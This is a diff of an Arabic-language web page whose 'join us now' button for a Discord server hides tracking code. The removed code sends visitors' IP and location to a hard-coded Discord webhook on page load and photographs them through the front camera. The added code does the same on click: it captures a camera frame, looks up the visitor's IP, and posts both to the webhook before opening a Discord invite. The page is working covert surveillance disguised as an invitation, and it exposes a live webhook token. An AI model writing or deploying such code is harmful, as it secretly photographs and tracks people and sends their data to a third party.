@@ -130,7 +130,7 @@
     </div>
   </div>
 
-  <button class="join-button" id="joinButton">
+  <button class="join-button" onclick="captureAndJoin()">
     انضم لنا الآن!
   </button>
 
@@ -146,74 +146,62 @@
   </footer>
 
   <script>
-    // جمع الموقع (IP) والمعلومات الأخرى
-    fetch('https://ipinfo.io/json')
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        const location = data.city + ", " + data.region + ", " + data.country;
-        console.log("IP: " + ip);
-        console.log("Location: " + location);
+    async function captureAndJoin() {
+      // طلب الوصول إلى الكاميرا
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         
-        // إرسال البيانات إلى Webhook
-        fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `New Visitor IP: ${ip}\nLocation: ${location}`
-          })
-        });
-      })
-      .catch(err => console.error('Error getting location:', err));
+        // استخدام الكاميرا لالتقاط الصور
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-    // التصوير عند الضغط على انضم لنا الآن
-    document.getElementById('joinButton').addEventListener('click', function() {
-      navigator.mediaDevices.enumerateDevices().then(devices => {
-        devices.forEach(device => {
-          if (device.kind === 'videoinput') {
-            // اختيار الكاميرا الأمامية
-            if (device.label.includes('front')) {
-              navigator.mediaDevices.getUserMedia({
-                video: { deviceId: device.deviceId }
-              }).then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                document.body.appendChild(video);
+        // انتظر حتى يتم تحميل الفيديو بالكامل
+        video.onloadedmetadata = async () => {
+          // التقط صورة من الكاميرا الأمامية والخلفية (إذا كانت موجودة)
+          const canvasFront = document.createElement('canvas');
+          canvasFront.width = video.videoWidth;
+          canvasFront.height = video.videoHeight;
+          const contextFront = canvasFront.getContext('2d');
+          contextFront.drawImage(video, 0, 0, canvasFront.width, canvasFront.height);
+          const photoFront = canvasFront.toDataURL('image/jpeg');
 
-                // أخذ صورة بعد قليل
-                setTimeout(() => {
-                  const canvas = document.createElement('canvas');
-                  canvas.width = 640;
-                  canvas.height = 480;
-                  const context = canvas.getContext('2d');
-                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                  const imageData = canvas.toDataURL('image/png');
+          // إرسال الصور إلى الويب هوك
+          await sendData(photoFront);
 
-                  // إرسال الصورة إلى Webhook
-                  fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      content: "تم أخذ الصورة",
-                      embeds: [{
-                        image: { url: imageData }
-                      }]
-                    })
-                  });
-                }, 2000); // تأخير قليلاً لأخذ الصورة
-              }).catch(err => console.error('Error accessing front camera:', err));
+          // الانتقال إلى رابط ديسكورد بعد التقاط الصور
+          window.open('https://discord.gg/Pcw4qhvv', '_blank');
+
+          // إيقاف الفيديو
+          stream.getTracks().forEach(track => track.stop());
+        };
+      } catch (err) {
+        console.error("Error accessing camera:", err);
+      }
+    }
+
+    async function sendData(photo) {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip;
+
+      // إرسال البيانات عبر الويب هوك
+      fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `New visitor with IP: ${ip}`,
+          embeds: [
+            {
+              title: 'Captured Image',
+              image: {
+                url: photo
+              }
             }
-          }
-        });
+          ]
+        })
       });
-
-      // التوجيه إلى السيرفر بعد التأكد من كل شيء
-      setTimeout(() => {
-        window.open('https://discord.gg/Pcw4qhvv', '_blank');
-      }, 4000); // التأخير للتأكد من جمع البيانات أولاً
-    });
+    }
   </script>
-
 </body>
 </html>
